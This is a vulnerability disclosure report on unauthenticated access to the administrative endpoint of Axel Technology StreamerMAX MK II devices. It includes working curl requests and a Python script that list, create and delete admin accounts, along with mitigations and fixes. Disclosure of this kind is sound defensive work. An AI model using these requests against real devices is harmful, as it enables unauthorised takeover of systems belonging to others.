# Vulnerability Report: Axel Technology StreamerMAX MK II - Broken Access Control

## Description
The Axel Technology StreamerMAX MK II devices (firmware versions **0.8.5 to 1.0.3**) are vulnerable to **Broken Access Control** due to missing authentication on the `/cgi-bin/gstFcgi.fcgi` endpoint.  
Unauthenticated remote attackers can list user accounts, create new administrative users, delete users, and modify system settings, leading to full compromise of the device.

---

## Vendor Information
- **Vendor:** Axel Technology  
- **Vendor Homepage:** [https://www.axeltechnology.com/](https://www.axeltechnology.com/)  

---

## Affected Products/Versions
| Product | Firmware Version |
|---------|------------------|
| StreamerMAX MK II | 0.8.5 to 1.0.3 |

---

## Vulnerable Endpoints
- `/cgi-bin/gstFcgi.fcgi`

---

## Attack Type
| Type | Classification |
|------|---------------|
| Broken Access Control | Improper Authorization |

---

## Impact
### **Severity:** High  
The Axel Technology StreamerMAX MK II devices are vulnerable to Broken Access Control due to the absence of proper authentication and authorization checks on sensitive administrative endpoints.

### **An unauthenticated remote attacker can:**
- List existing user accounts  
- Add new administrative users  
- Delete existing users  
- Take full control of the device  

This vulnerability enables unauthorized **privilege escalation** and **complete device takeover**.

---

## Affected Components
- **Access Control:** Direct access to sensitive administrative endpoints without authentication.  
- **User Management:** Ability to add, modify, and delete user accounts without authentication.  
- **Privilege Escalation:** Attackers can gain administrative control over the system.  

---

## Attack Vectors
| Method | Description |
|--------|-------------|
| **Access Method** | Remote, over HTTP |
| **Authentication Requirement** | None (unauthenticated) |
| **Exploit Complexity** | Low (simple HTTP requests) |

---

## Proof of Concept (PoC)
### 1. **List User Accounts**
An attacker can list all user accounts directly using the following unauthenticated POST request:

```bash
curl '{target}/cgi-bin/gstFcgi.fcgi' -X POST --data-raw '{"LIST":"USERS"}'
```
Example Response:

```json
{
  "USERS": [
    {"USER":"admin", "SETUP":1, "ADMIN":1, "TUNER1":1, "TUNER2":1, "AUDIO":1}
  ]
}
```
### 2. **Add a New Administrative User**

Attackers can create a new administrative user using the following POST request:

```bash
curl '{target}/cgi-bin/gstFcgi.fcgi' -X POST --data-raw '{
  "USER":"admin",
  "ADD_USER":{
    "USER":"tester",
    "PASS":"tester",
    "SETUP":1,
    "ADMIN":1,
    "TUNER1":1,
    "TUNER2":1,
    "AUDIO":1
  }
}'
```
Example Response:

```json
{
  "ADD_USER": "OK"
}
```

### 3. **Confirm the New User Exists**

Attackers can confirm that the new user exists using:

```bash
curl '{target}/cgi-bin/gstFcgi.fcgi' -X POST --data-raw '{"LIST":"USERS"}'
```
Example Response:

```json
{
  "USERS": [
    {"USER":"admin", "SETUP":1, "ADMIN":1, "TUNER1":1, "TUNER2":1, "AUDIO":1},
    {"USER":"tester", "SETUP":1, "ADMIN":1, "TUNER1":1, "TUNER2":1, "AUDIO":1}
  ]
}
```
### 4. **Delete an Existing User**

Attackers can delete the new user without authentication:

```bash
curl '{target}/cgi-bin/gstFcgi.fcgi' -X POST --data-raw '{
  "USER":"admin",
  "DEL_USER":"tester"
}'
```

Example Response:

```json
{
  "DELETED": "tester"
}
```
---

## **Automated Exploit (Python PoC Script)**

The following Python script automates the attack process:

```python
import requests
import json

target = "http://<target-ip>/cgi-bin/gstFcgi.fcgi"

# List Users
def list_users():
    payload = {"LIST": "USERS"}
    response = requests.post(target, json=payload)
    print(response.json())

# Add New Admin User
def add_user():
    payload = {
        "USER": "admin",
        "ADD_USER": {
            "USER": "tester",
            "PASS": "tester",
            "SETUP": 1,
            "ADMIN": 1,
            "TUNER1": 1,
            "TUNER2": 1,
            "AUDIO": 1
        }
    }
    response = requests.post(target, json=payload)
    print(response.json())

# Delete User
def delete_user():
    payload = {
        "USER": "admin",
        "DEL_USER": "tester"
    }
    response = requests.post(target, json=payload)
    print(response.json())

if __name__ == "__main__":
    print("[+] Listing Users...")
    list_users()
    print("[+] Adding User 'tester'...")
    add_user()
    print("[+] Listing Users After Addition...")
    list_users()
    print("[+] Deleting User 'tester'...")
    delete_user()
    print("[+] Listing Users After Deletion...")
    list_users()
```
---

## **PoC Video**  

https://github.com/user-attachments/assets/ca044b42-3347-44f4-91d2-d0392e2f3085

---

## Vulnerability Type Information

| Vulnerability Type         | CWE-ID                           |
|---------------------------|----------------------------------|
| Broken Access Control      | CWE-284 (Improper Access Control) |
| Improper Authorization     | CWE-285 (Improper Authorization)  |

---

## Impact Information

| Impact Type                  | Description                                                                 |
|-----------------------------|-----------------------------------------------------------------------------|
| **Privilege Escalation**      | Unauthenticated attackers can create administrative accounts.               |
| **Account Takeover**          | Attackers can list and delete existing accounts.                             |
| **Complete Device Compromise** | Attackers can control device settings and access sensitive information.      |

---

## Suggested Fixes

### Authentication
- Implement mandatory authentication for all sensitive endpoints.

### Access Control
- Enforce role-based access control (RBAC).  
- Restrict administrative endpoints to trusted IP addresses.

### Session Management
- Ensure secure session handling and prevent session fixation attacks.

### Input Validation
- Validate POST parameters to prevent unauthorized actions.

---

## Mitigation & Workarounds

Until a patch is released, administrators should:
- Restrict access to the `/cgi-bin/gstFcgi.fcgi` endpoint using firewall rules.  
- Monitor network traffic for suspicious activity.  
- Require VPN or secure tunnel for administrative access.  
- Disable public access to the device interface.  
